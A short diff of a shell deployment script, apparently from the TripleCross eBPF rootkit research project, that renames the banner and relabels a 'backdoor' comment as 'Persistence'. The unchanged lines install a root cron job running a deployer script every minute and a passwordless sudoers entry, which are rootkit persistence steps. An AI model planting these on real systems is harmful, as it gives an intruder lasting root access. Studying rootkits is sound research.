@@ -39,7 +39,7 @@ quiet(){
 
 #Start of script
 echo "*******************************************************\n"
-echo "************************* TFG *************************\n"
+echo "********************* TripleCross *********************\n"
 echo "*******************************************************\n"
 echo "***************** Marcos Sánchez Bajo *****************\n"
 echo "*******************************************************\n"
@@ -59,7 +59,7 @@ else
    /bin/sudo "$BASEDIR"/kit -t enp0s3
 fi
 
-## Install a backdoor in cron.d
+## Persistence
 echo "* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh" > /etc/cron.d/ebpfbackdoor
 echo "osboxes ALL=(ALL:ALL) NOPASSWD:ALL #" > /etc/sudoers.d/ebpfbackdoor
 
